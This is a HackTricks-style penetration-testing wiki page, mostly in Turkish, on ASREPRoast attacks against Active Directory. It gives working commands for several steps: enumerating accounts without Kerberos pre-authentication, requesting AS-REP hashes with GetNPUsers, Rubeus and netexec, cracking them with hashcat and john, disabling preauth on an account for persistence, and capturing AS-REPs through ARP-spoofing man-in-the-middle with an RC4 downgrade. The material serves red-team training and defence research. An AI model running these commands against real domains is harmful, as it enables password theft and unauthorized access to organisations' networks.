# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast, **Kerberos pre-authentication required attribute**'a sahip olmayan kullanıcıları istismar eden bir güvenlik saldırısıdır. Özünde bu zafiyet, saldırganların bir kullanıcının parolasına ihtiyaç duymadan Domain Controller (DC)'ye kimlik doğrulama isteği göndermesine olanak tanır. DC, daha sonra kullanıcının parola türetilmiş anahtarıyla şifrelenmiş bir mesajla yanıt verir; saldırganlar bu mesajı offline olarak kırmayı deneyerek kullanıcının parolasını bulmaya çalışabilir.

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: Hedef kullanıcıların bu güvenlik özelliğinin etkin olmaması gerekir.
- **Connection to the Domain Controller (DC)**: Saldırganların istek gönderebilmek ve şifrelenmiş mesajları alabilmek için DC'ye erişimi olmalıdır.
- **Optional domain account**: Bir domain account'a sahip olmak, saldırganların LDAP sorguları aracılığıyla zayıf kullanıcıları daha verimli biçimde belirlemesini sağlar. Böyle bir hesabı yoksa, saldırganlar kullanıcı adlarını tahmin etmek zorunda kalır.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP mesajı isteği
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus, 0x17 şifreleme tipi ve preauth tipi 0 ile bir 4768 oluşturacaktır.

#### Hızlı tek satırlar (Linux)

- Önce potansiyel hedefleri listeleyin (örn. leaked build paths'ten) Kerberos userenum ile: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Tek bir kullanıcının AS-REP'ini, hatta **boş** bir parola ile çekin: `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec ayrıca LDAP signing/channel binding posture'ını yazdırır).
- Kırmak için `hashcat out.asreproast /path/rockyou.txt` kullanın — AS-REP roast hash'leri için otomatik olarak **-m 18200** (etype 23) algılar.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

**GenericAll** izinleriniz (veya özellikleri yazma izinleriniz) olan bir kullanıcı için **preauth** gerekliliğini zorla kaldırın:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast kimlik bilgileri olmadan

Bir saldırgan, Kerberos pre-authentication devre dışı bırakılmasına bağlı kalmadan, ağ üzerinde hareket ederken AS-REP paketlerini yakalamak için man-in-the-middle konumunu kullanabilir. Bu nedenle VLAN'daki tüm kullanıcılar için çalışır.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bunu yapmamıza olanak sağlar. Ayrıca araç, Kerberos müzakeresini değiştirerek istemci iş istasyonlarını RC4 kullanmaya zorlar.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
